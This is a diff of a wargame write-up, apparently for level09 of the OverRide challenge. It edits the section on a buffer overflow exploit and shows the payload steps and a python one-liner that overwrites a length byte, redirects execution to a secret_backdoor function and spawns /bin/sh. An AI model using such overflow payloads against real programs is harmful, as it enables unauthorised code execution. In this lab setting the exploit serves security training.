@@ -95,7 +95,7 @@ $1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
 
 ### Build exploit
 
-So we build our exploit:
+So we build our exploit string:
 1. 40 byte username buffer, until overflow ```len``` - ```"A" * 40```
 2. 1 byte, max value, overwrite ```len``` - ```\xff```
 3. new line, enter unsername - ```\n```
@@ -104,7 +104,7 @@ So we build our exploit:
 6. new line, enter msg - ```\n```
 7. system() open shell command - ```/bin/sh```
 
-Let's pipe that into the binary stdin.
+Let's pipe our exploit string into the binary stdin.
 ```
 level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"'; cat) | ./level09
 --------------------------------------------
